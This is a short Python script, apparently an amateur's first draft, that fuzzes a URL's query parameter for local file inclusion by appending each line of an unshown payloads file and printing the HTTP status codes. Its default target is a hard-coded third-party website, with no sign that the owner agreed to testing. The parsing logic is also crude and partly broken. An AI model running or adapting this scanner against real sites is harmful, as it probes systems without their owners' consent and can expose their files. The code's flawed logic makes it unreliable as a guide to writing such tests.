import requests

def lfi(string):

    mike = string.find("=")
    print(mike)

    reading = open("payloads.txt", "r")
    looking = reading.readlines()

    myList = []

    for x in looking:
        y = x.strip("\n")
        myList.append(y)

    for x in range(len(string)):
        if string[x] == "=":
            new = x + 1
            print(new)
            print(string[new])
            sep = string[new]
            stripped = string.split(sep, 1)[0]
            print(stripped)

            for y in myList:
                print(stripped)
                response = requests.get(stripped + y)
                print(stripped + y)
                result = response.status_code
                print(result)

url = "http://berkeleyrecycling.org/page.php?id=1"
new = input("Please input a url you would like to test for lfi on:")
question = input("this is a question for the sake of this first draft of the coding project or smth idk")
if question == "new":
    lfi(new)
else:
    lfi(url)